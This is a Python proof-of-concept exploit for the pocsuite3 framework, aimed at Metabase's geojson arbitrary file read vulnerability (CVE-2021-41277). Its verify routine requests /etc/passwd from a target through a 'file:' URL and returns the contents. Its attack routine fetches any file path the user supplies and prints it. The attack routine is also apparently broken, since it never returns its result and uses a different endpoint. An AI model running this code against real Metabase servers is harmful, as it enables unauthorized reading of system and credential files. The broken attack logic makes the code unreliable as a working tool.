from collections import OrderedDict
import urllib.parse
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2021-09-14'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-09-14'  # 编写 PoC 的日期
    updateDate = '2021-09-14'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://www.cnvd.org.cn/flaw/show/CNVD-2020-48650']  # 漏洞地址来源,0day不用写
    name = 'Metabase 任意文件读取'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'Metabase'  # 漏洞应用名称
    appVersion = '''< 0.40.5 and < 1.40.5 and >= 1.0.0'''  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Metabase geojson 任意文件读取漏洞 CVE-2021-41277
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result = {}
        path = '/api/geojson?url=file:/etc/passwd'
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            }
        try:
            resq=requests.get(url=url,headers=headers)
            if resq and resq.status_code == 200 and "root" in resq.text and "metabase" in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['content'] = '\n'+resq.text
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        path = '/download/'
        file = self.get_option("path")
        url = self.url + path + file
        try:
            r=requests.Request('GET', url).prepare()
            r.url=url
            resq=requests.session().send(r,timeout=5)
            t = resq.text
            print('output >>> \n' + t)
            t = t.replace(" ", "")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = t
        except Exception as e:
            return

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)
